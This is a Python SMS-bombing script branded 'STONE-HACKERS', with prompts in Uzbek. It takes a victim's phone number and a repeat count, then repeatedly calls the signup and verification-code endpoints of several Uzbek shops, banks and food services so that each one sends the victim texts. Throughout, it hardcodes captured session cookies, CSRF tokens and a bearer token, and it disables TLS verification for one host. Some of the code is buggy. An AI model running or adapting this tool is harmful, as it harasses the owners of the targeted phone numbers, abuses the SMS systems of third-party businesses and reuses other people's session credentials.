from termcolor import colored
import requests, os, time, urllib3

os.system("clear")

print(colored("""\n
 ####################################################################################
 #                                                                                  #
 #                              Telegram : @stonehackers                            #
 #                                                                                  #
 #     _______________  _   ________     __  _____   ________ __ __________  _____  #
 #    / ___/_  __/ __ \/ | / / ____/    / / / /   | / ____/ //_// ____/ __ \/ ___/  #
 #    \__ \ / / / / / /  |/ / __/______/ /_/ / /| |/ /   / ,<  / __/ / /_/ /\__ \   #
 #   ___/ // / / /_/ / /|  / /__/_____/ __  / ___ / /___/ /| |/ /___/ _, _/___/ /   #
 #  /____//_/  \____/_/ |_/_____/    /_/ /_/_/  |_\____/_/ |_/_____/_/ |_|/____/    #
 #                                                                                  #
 #                                                                                  #
 ####################################################################################
""", 'blue'))

phone_number = input(colored(" [*] Kimga Xabar Yuboramiz: ", 'blue'))

loop = int(input(colored("\n [*] Nechta Xabar Yuboramiz: ", 'blue')))

if len(phone_number) == 13:

	print()

else:

	print(colored("\n [*] Xato Telefon Raqam Kiritdingiz! ", 'red'))
	time.sleep(3)
	os.system("clear")
	exit()

mahsulot_t = 0
mahsulot_e = 0
telegram_t = 0
telegram_e = 0
pizza_t = 0
pizza_e = 0
sqb_t = 0
sqb_e = 0
yuzk_t = 0
yuzk_e = 0
olcha_t = 0
olcha_e = 0
tashabbus_t = 0
tashabbus_e = 0
ipotekabank_t = 0
ipotekabank_e = 0
lavash_t = 0
lavash_e = 0
evos_t = 0
evos_e = 0
najot_t = 0
najot_e = 0

def send_modified_request(phone_number):

	url = "https://mahsulot.com/sellers/?next=/sellers/profil"

	headers = {

		"Host": "mahsulot.com",
		"Cookie": "csrftoken=E5NhJAMM5Uv4tieNiewYLrlzmIVY6P1Wu2Trydi2noGo2RwwMyQMRvv1rPL31YEN; _ym_uid=1691417085540783261; _ym_d=1691417085; _ym_isad=2; _ym_visorc=w; sessionid=htjwbnx76oywfvrgqxq1skz6acxtfbsy",
		"Cache-Control": "max-age=0",
		"Sec-Ch-Ua": "",
		"Sec-Ch-Ua-Mobile": "?0",
		"Sec-Ch-Ua-Platform": '""',
		"Upgrade-Insecure-Requests": "1",
		"Origin": "https://mahsulot.com",
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"Sec-Fetch-Site": "same-origin",
		"Sec-Fetch-Mode": "navigate",
		"Sec-Fetch-User": "?1",
		"Sec-Fetch-Dest": "document",
		"Referer": "https://mahsulot.com/sellers/?next=/sellers/profil",
		"Accept-Encoding": "gzip, deflate",
		"Accept-Language": "en-US,en;q=0.9"
	}

	payload = {
	"csrfmiddlewaretoken": "meweNVaJ5gdI4inucT8u1siMm5GGy9jAcbCoCyGZnKo2DRFdGdsi7wsercwLtiWr",
	"phone": phone_number

	}
	response = requests.post(url, headers=headers, data=payload)

	global mahsulot_t, mahsulot_e, telegram_t, telegram_e, pizza_t, pizza_e, sqb_t, sqb_e, yuzk_t, yuzk_e, olcha_t, olcha_e, tashabbus_t, tashabbus_e, ipotekabank_t, ipotekabank_e, lavash_t, lavash_e, evos_t, evos_e

	if response.status_code == 200:

		mahsulot_t += 1

		print(colored(f" [*] Status Code : {response.status_code} {response.reason} | Qayerga : {phone_number} | Qayerdan : Mahsulot | {mahsulot_t} SMS Yuborildi! ", 'blue'))

	else:

		mahsulot_e += 1

		print(colored(f" [*] Status Code : {response.status_code} {response.reason} | Qayerga : {phone_number} | Qayerdan : Mahsulot | {mahsulot_e} SMS Yuborilmadi! ", 'red'))

#############################################################################   Telegramdan xabar borsih qismi

	"""url_telegram = f"https://oauth.tg.dev/auth/request?bot_id=1288099309&origin=https://t.me&lang=en&phone={phone_number}"

	response = requests.post(url_telegram)

	if response.status_code == 200:

		telegram_t += 1

		print(colored(f" [*] Status Code : {response.status_code} {response.reason} | Qayerga : {phone_number} | Qayerdan : Telegram | {telegram_t} Xabar Yuborildi! ", 'blue'))

	else:

		teelegram_e += 1
		status_error = response.status_code
		reason_error = response.reason

		print(colored(" [*] Status Code : {status_error} {reason_error} | Qayerga : {phone_number} | Qayerga : Telegram | {telegram_e} Xabar Yuborilmadi! ", 'red'))"""

############################################################################# Sariq bola pizzaa


	url = "https://sariqbolapizza.uz/v1/customers/register"

	headers = {

		"POST": "/v1/customers/register HTTP/2",
		"Host": "customer.api.delever.uz",
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
		"Accept": "application/json, text/plain, */*",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip, deflate",
		"Content-Type": "application/json",
		"Shipper": "3e46e52f-583d-4110-ba54-1b5194990bbd",
		"Platform": "website",
		"Content-Length": "57",
		"Origin": "https://sariqbolapizza.uz",
		"Referer": "https://sariqbolapizza.uz/",
		"Sec-Fetch-Dest": "empty",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Site": "cross-site",
		"Te": "trailers"
	}

	payload = {

		"phone":phone_number,
		"registration_source":"website"

	}

	response = requests.post(url, headers=headers, json=payload)

	if response.status_code == 200:

		pizza_t += 1

		print(colored(f" [*] Status Code : {response.status_code} {response.reason} | Qayerga : {phone_number} | Qayerdan : Sariq Bola Pizza | {pizza_t} Xabar Yuborildi! ", 'blue'))

	else:

		pizza_e += 1

		print(colored(f" [*] Status Code : {response.status_code} {response.reason} | Qayerga : {phone_number} | Qayerdan : Sariq Bola Pizza | {pizza_e} Xabar Yuborilmadi! ", 'red'))


#######################################################################   Sanoat Qurilish Bank - SQB


	url = "https://business.sqb.uz/api/auth/signup"

	headers = {

		"POST": "/api/auth/signup HTTP/1.1",
		"Host": "business.sqb.uz",
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
		"Accept": "application/json, text/plain, */*",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip, deflate",
		"Content-Type": "application/json",
		"Content-Length": "83",
		"Origin": "https://business.sqb.uz",
		"Referer": "https://business.sqb.uz/auth/register",
		"Sec-Fetch-Dest": "empty",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Site": "same-origin",
		"Te": "trailers",
		"Connection": "close",
	}
	payload = {

		"method":"core.sendconfcode",
		"phoneNum":phone_number,
		"smsMethod":"registration"
	}

	response = requests.post(url, headers=headers, json=payload)

	if response.status_code == 200:

		sqb_t += 1

		print(colored(f" [*] Status Code : {response.status_code} OK | Qayerga : {phone_number} | Qayerdan : Sanoat Qurilish Bank | {sqb_t} Xabar Yuborildi! ", 'blue'))

	else:

		sqb_e += 1

		print(colored(f" [*] Status Code : {response.status_code} {response.reason} | Qayerga : {phone_number} | Qayerdan : Sanoat Qurilish Bank | {sqb_t} Xabar Yuborilmadi! ", 'red'))

######################################################################


	url = "https://api.100k.uz/api/auth/sms-login?"

	headers = {

		'POST': '/api/auth/sms-login? HTTP/1.1',
		'Host': 'api.100k.uz',
		'Content-Length': '58',
		'Sec-Ch-Ua': '" Not A;Brand";v="99", "Chromium";v="104"',
		'Accept': 'aplication/json',
		'Content-Type': 'application/json',
		'Authorization': 'Bearer null',
		'Sec-Ch-Ua-Mobile': '?0',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537>.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36',
		'Sec-Ch-Ua-Platform': "Linux",
		'Origin': 'https://adv.100k.uz',
		'Sec-Fetch-Site': 'same-site',
		'Sec-Fetch-Mode': 'cors',
		'Sec-Fetch-Dest': 'empty',
		'Referer': 'https://adv.100k.uz/',
		'Accept-Encoding': 'gzip, deflate',
		'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
		'Connection': 'close'

	}

	payload = {

        	"phone":phone_number,
        	"username":""
	}

	response = requests.post(url, headers=headers, json=payload)

	if response.status_code == 200:

		yuzk_t += 1

		print(colored(f" [*] Status Code : {response.status_code} {response.reason} | Qayerga : {phone_number} | Qayerdan : 100K.uz | {yuzk_t} Xabar Yuborildi! ", 'blue'))

	else:

		yuzk_e += 1

######################################################################

	url = "https://5tashabbus.uz/Account/SendSMSCodeWithoutRegistration"

	headers = {

		'POST': '/Account/SendSMSCodeWithoutRegistration HTTP/2',
		'Host': 'api.5tashabbus.uz',
		'Cookie': 'requestId=495CE0CA22D643418093B112BAB39937',
		'Content-Length': '66',
		'Sec-Ch-Ua': '" Not A;Brand";v="99", "Chromium";v="104"',
		'Accept': 'application/json, text/plain, */*',
		'Content-Type': 'application/json',
		'Sec-Ch-Ua-Mobile': '?0',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36',
		'Sec-Ch-Ua-Platform': "Linux",
		'Origin': 'https://5tashabbus.uz',
		'Sec-Fetch-Site': 'same-site',
		'Sec-Fetch-Mode': 'cors',
		'Sec-Fetch-Dest': 'empty',
		'Referer': 'https://5tashabbus.uz/',
		'Accept-Encoding': 'gzip, deflate',
		'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8'
	}

	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

	payload = {"phonenumber":phone_number,"smscode":"","isRestore":"true"}

	response = requests.post(url, headers=headers, json=payload, verify=False)

	if response.status_code == 200:

		tashabbus_t += 1

		print(colored(f" [*] Status Code : {response.status_code} {response.reason} | Qayerga : {phone_number} | Qayerdan : 5tashabbus.uz | {tashabbus_t} Xabar Yuborildi! ", 'blue'))

	else:

		tashabbus_e += 1

		print(colored(f" [*] Status Code : {response.status_code} {response.reason} | Qayerga : {phone_number} | Qayerdan : 5tashabbus.uz | {tashabbus_e} Xabar Yuborilmadi! ", 'red'))

####################################################################

	url = "https://cc.oqtepalavash.uz/api/sms/Send"

	headers = {

		'POST': '/api/sms/Send HTTP/1.1',
		'Host': 'cc.oqtepalavash.uz',
		'Content-Length': '37',
		'Sec-Ch-Ua': '" Not A;Brand";v="99", "Chromium";v="104"',
		'Accept': 'application/json',
		'Content-Type': 'application/json; charset=utf-8',
		'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoid2ViIiwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvbmFtZWlkZW50aWZpZXIiOiJjYTZjZDQ0Zi0xMzM3LTQ3NzItODUxZi1lYzZmZDc5N2NlNDYiLCJuYmYiOjE2OTQzNzUzMTUsImV4cCI6MTY5NDM3ODkxNSwiaXNzIjoiQVNERyBEZWxpdmVyeSIsImF1ZCI6Imh0dHBzOi8vZGVsaXZlcnkuYXNkZy51ei8ifQ.JZNAYI4_Oj93Ig6MJI_l0t3TlX4PK8wLHYhoBq4u0q4',
		'Sec-Ch-Ua-Mobile': '?0',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36',
		'Sec-Ch-Ua-Platform': "Linux",
		"Origin": 'https://oqtepalavash.uz',
		'Sec-Fetch-Site': 'same-site',
		'Sec-Fetch-Mode': 'cors',
		'Sec-Fetch-Dest': 'empty',
		'Referer': 'https://oqtepalavash.uz/',
		'Accept-Encoding': 'gzip, deflate',
		'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
		'Connection': 'close'

	}

	payload = {

		"phone":phone_number,
		"language":1

	}


	response = requests.post(url, headers=headers, json=payload)

	if response.status_code == 200:

		lavash_t += 1

		print(colored(f" [*] Status Code : {response.status_code} OK | Qayerga : {phone_number} | Qayerdan : Oqtepalavash.uz | {lavash_t} Xabar Yuborildi! ", 'blue'))

	else:

		lavash_e += 1

		print(colored(f" [*] Status Code : {respons.status_code} OK | Qayerga : {phone_number} | Qayerdan : Ipotekabank.uz | {lavash_e} Xabar Yuborilmadi! ", 'red'))

###################################################################



	url = "https://mobile.olcha.uz/api/v2/sendsms2"

	headers = {

		"POST": "/api/v2/sendsms2 HTTP/1.1",
		"Host": "mobile.olcha.uz",
		"Content-Length": "24",
		"Sec-Ch-Ua": '" Not A;Brand";v="99", "Chromium";v="104"',
		"Accept": "application/json",
		"Content-Type": "application/json",
		"Accept-Language": "ru",
		"Sec-Ch-Ua-Mobile": "?0",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36",
		"Sec-Ch-Ua-Platform": "Linux",
		"Origin": "https://olcha.uz",
		"Sec-Fetch-Site": "same-site",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
		"Referer": "https://olcha.uz/",
		"Accept-Encoding": "gzip, deflate",
		"Connection": "close"

	}

	payload = {

		"phone":phone_number

	}


	response = requests.post(url, headers=headers, json=payload)

	if response.status_code == 200:

		olcha_t += 1

		print(colored(f" [*] Status Code : {response.status_code} {response.reason} | Qayerga : {phone_number} | Qayerdan : Olcha.uz | {olcha_t} Xabar Yuborildi! ", 'blue'))

	else:

		olcha_e += 1

		pass

##################################################################

for i in range(0, loop):

	send_modified_request(phone_number)

print(colored(f"\n [*] Yuborilgan Mahsulot.com : {mahsulot_t} \n [*] Yuborilmagan Mahsulot.com : {mahsulot_e} \n\n [*] Telegram Yuborilgan Xabar : {telegram_t} \n [*] Telegram Yuborilmagan Xabar : {telegram_e} \n\n [*] Yuborildi Sariq Bola Pizza : {pizza_t} \n [*] Yuborilmadi Sariq Bola Pizza : {pizza_e} \n\n [*] SQB Yuborildi : {sqb_t} \n [*] SQB Yuborilmadi : {sqb_e} \n\n [*] 100K.uz Yuborilgan : {yuzk_t} \n [*] Yuborilmagan 100K.uz {yuzk_e} \n\n [*] 5tashabbus.uz Yuborilgan {tashabbus_t} \n [*] 5tashabbus Yuborilmagan {tashabbus_e} \n\n [*] Ipotekabank.uz Yuborilgan : {ipotekabank_t} \n [*] Ipotekabank.uz Yuborilmagan : {ipotekabank_e} \n\n [*] Oqtepalavash.uz Yuborilgan : {lavash_t} \n [*] Oqtepalavash.uz Yuborilmagan : {lavash_e} \n\n [*] Evos.uz Yuborilgan : {evos_t} \n [*] Evos.uz Yuborilmagan : {evos_e} \n\n [*] Olcha.uz Yuborilgan : {olcha_t} \n [*] Olcha Yuborilmagan : {olcha_e} \n\n [*] Jami Yuborilgan Xabar : {int(mahsulot_t) + int(telegram_t) + int(pizza_t) + int(sqb_t) + int(yuzk_t) + int(olcha_t) + int(olcha_t) + int(ipotekabank_t) + int(lavash_t) + int(evos_t) + int(olcha_t)} \n [*] Jami Yuborilmagan Xabar : {int(mahsulot_e) + int(telegram_e) + int(pizza_e) + int(sqb_e) + int(yuzk_e) + int(olcha_e) + int(ipotekabank_e) + int(lavash_e) + int(evos_e)} ", 'red'))
exit()
